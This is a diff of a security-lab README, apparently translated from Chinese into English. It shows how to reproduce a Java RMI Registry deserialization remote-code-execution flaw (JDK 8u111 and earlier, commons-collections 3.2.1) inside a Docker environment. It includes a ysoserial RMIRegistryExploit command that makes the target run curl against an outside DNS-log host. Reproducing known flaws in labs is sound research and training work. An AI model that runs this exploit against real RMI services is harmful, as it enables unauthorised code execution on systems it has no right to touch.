@@ -1,28 +1,35 @@
-# Java RMI Registry 反序列化漏洞(<=jdk8u111)
+# Java ≤JDK 8u111 RMI Registry Deserialization Remote Code Execution
 
-Java Remote Method Invocation 用于在Java中进行远程调用。RMI存在远程bind的功能(虽然大多数情况不允许远程bind)，在bind过程中，伪造Registry接收到的序列化数据(实现了Remote接口或动态代理了实现了Remote接口的对象)，使Registry在对数据进行反序列化时触发相应的利用链(环境用的是commons-collections:3.2.1).
+[中文版本(Chinese version)](README.zh-cn.md)
 
-## 漏洞环境
+Java Remote Method Invocation (RMI) is used for remote procedure calls in Java. Although remote binding is typically disabled, RMI Registry contains a remote binding functionality that can be exploited. By forging serialized data (implementing the Remote interface or dynamically proxying objects that implement the Remote interface) during the binding process, an attacker can trigger a deserialization vulnerability in the Registry when it processes the data. This environment uses commons-collections:3.2.1 for demonstration.
 
-执行如下命令编译及启动RMI Registry和服务器：
+References:
+
+- <https://www.rapid7.com/db/modules/exploit/multi/misc/java_rmi_server>
+- <https://github.com/frohoff/ysoserial>
+
+## Environment Setup
+
+Execute the following commands to compile and start the RMI Registry and server:
 
 ```
 docker compose build
 docker compose run -e RMIIP=your-ip -p 1099:1099 rmi
 ```
 
-其中，`your-ip`是服务器IP，客户端会根据这个IP来连接服务器。
+Replace `your-ip` with your server's IP address. The client will use this IP to connect to the server.
 
-环境启动后，RMI Registry监听在1099端口。
+After startup, the RMI Registry will be listening on port 1099.
 
-## 漏洞复现
+## Vulnerability Reproduction
 
-通过ysoserial的exploit包中的RMIRegistryExploit进行攻击
+Use the RMIRegistryExploit from ysoserial's exploit package to perform the attack:
 
 ```bash
 java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit your-ip 1099 CommonsCollections6 "curl your-dnslog-server"
 ```
 
-![image-20200206133552945](assets/README/image-20200206133552945.png)
+![](1.png)
 
-Registry会返回报错，这个没关系正常，命令会正常执行。
+The Registry will return an error, but this is normal and the command will still execute successfully.
